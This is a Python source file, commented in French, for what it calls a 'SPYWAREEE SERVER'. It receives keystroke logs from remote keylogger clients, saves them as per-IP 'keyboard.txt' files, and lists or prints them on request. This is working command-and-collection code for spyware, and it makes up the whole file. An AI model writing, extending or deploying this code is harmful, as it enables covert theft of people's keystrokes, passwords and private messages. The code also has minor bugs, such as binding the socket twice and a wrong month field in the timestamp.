import glob
import threading
import socket
import time
import sys
import signal
import argparse
from datetime import datetime
import os
import colorama
from colorama import Fore, Style

colorama.init()
def handle_co():
    global running_thrd, client_sockets
    while running_thrd:
        try:
            server.settimeout(1)
            client, addr = server.accept()
            client_sockets.append(client)
            rcv_file_thread = threading.Thread(target=recv_file_from_klg, args=(client,addr))
            rcv_file_thread.start()
        except socket.timeout:
            continue
        except BlockingIOError:
            continue
        except OSError:
            break
    if server is not None:
        server.close()

def stop_server():
    global running_thrd, client_sockets, server
    running_thrd = False
    print("Arrêt du serveur en cours...")
    for client in client_sockets:
        try:
            client.sendall(b"<SERVER_SHUTDOWN>")
            client.close()
            print("Shutdown signal envoyé")
        except Exception as e:
            print(Fore.RED + "Erreur lors de l'envoi de la fermeture au client : " + str(e) + Style.RESET_ALL)

    if server is not None:
        try:
            server.close()
            print("Le serveur a été fermé")
        except Exception as e:
            print(Fore.RED + "Erreur lors de l'envoi de la fermeture au client : " + str(e) + Style.RESET_ALL)

    if thrd_co is not None:
        thrd_co.join()

    if os.path.exists("server.lock"):
        os.remove("server.lock")
        print("Fichier de verrouillage supprimé")


def signal_handler(signal,frame):
    stop_server()
    sys.exit(0)

def list_spylog_files():
    files = glob.glob("*keyboard.txt")
    if not files:
        print(Fore.LIGHTMAGENTA_EX+"Aucun fichier trouvé\n"+Style.RESET_ALL)
        return
    for file in files:
        print(f"{Fore.LIGHTMAGENTA_EX}{file}{Style.RESET_ALL}")

def read_spylog_file(filename):
    try:
        with open(filename, "r") as f:
            print(f"{f.read()}\n")
    except FileNotFoundError:
        print(f"Le fichier {filename} n'existe pas !\n")
    except Exception as e:
        print(f"Erreur survenue lors de lecture du fichier {filename} : {e}\n")

def listen_port(port):
    global server
    print(Fore.YELLOW + "Listening on port " + str(port) + "..." + Style.RESET_ALL)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('localhost',port)) # localhost
    server.listen(5)
    server.setblocking(True)

def recv_file_from_klg(client_sock, addr):
    global running_thrd
    bufer_size = 1024 # Pour la reception des data
    try:
        while running_thrd:
            _ = client_sock.recv(bufer_size).decode().strip()
            if not _:
                print(Fore.RED + "Aucune donnée reçue, fin de la connexion" + Style.RESET_ALL)
                return
            # Generation du nom de fichier unique
            timestamp = datetime.now().strftime("%Y%M%d_%H%M%S")
            ip_client = addr[0].replace(".", "-")
            unique_filename = f"{ip_client}_{timestamp}-keyboard.txt"

            with open(unique_filename, "wb") as f:
                print(Fore.GREEN + "Début de réception du fichier " + unique_filename + Style.RESET_ALL)
                while running_thrd:
                    data = client_sock.recv(bufer_size)
                    if not data or b"<END>" in data:
                        f.write(data[:-5]) # Je supprime <END>
                        break
                    f.write(data)
                client_sock.sendall(b"ACK")
                print(Fore.CYAN + "Fichier " + unique_filename + " reçu avec succès" + Style.RESET_ALL)
    except KeyboardInterrupt as e:
        print(f"CTRL + C détecté: {e}")
        client_sock.close()

running_thrd = False
client_sockets = []
server = None
thrd_co = None

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SPYWAREEE SERVER")
    parser.add_argument("-l", "--listen", help="Listen port, default 9998", type=int, default=9998)
    parser.add_argument("-s", "--show", help="List all spylog files", action="store_true")
    parser.add_argument("-r", "--read", help="Read the indicated spylog file", type=str)
    parser.add_argument("-k", "--kill", help="Kill the process", action="store_true")

    args = parser.parse_args()
    start_server = True
    if args.kill:
        if os.path.exists("server.lock"):
            stop_server()
            print(Fore.GREEN + "Le serveur a été fermé" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Le serveur n'est pas en cours d'exécution" + Style.RESET_ALL)
        sys.exit(0)  # Sortir du script ici

    if args.show:
        list_spylog_files()
        start_server = False
    elif args.read:
        read_spylog_file(args.read)
        start_server = False


    if start_server:
        open('server.lock', 'w').close()
        listen_port(args.listen)
        signal.signal(signal.SIGINT, signal_handler)

        host, port = ("localhost", args.listen)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen()
        server.setblocking(True)

        running_thrd = True
        

        thrd_co = threading.Thread(target=handle_co)
        thrd_co.start()

        try:
            while running_thrd:
                time.sleep(1)
        except KeyboardInterrupt:
            signal_handler(None, None)
            if thrd_co is not None:
                thrd_co.join()
        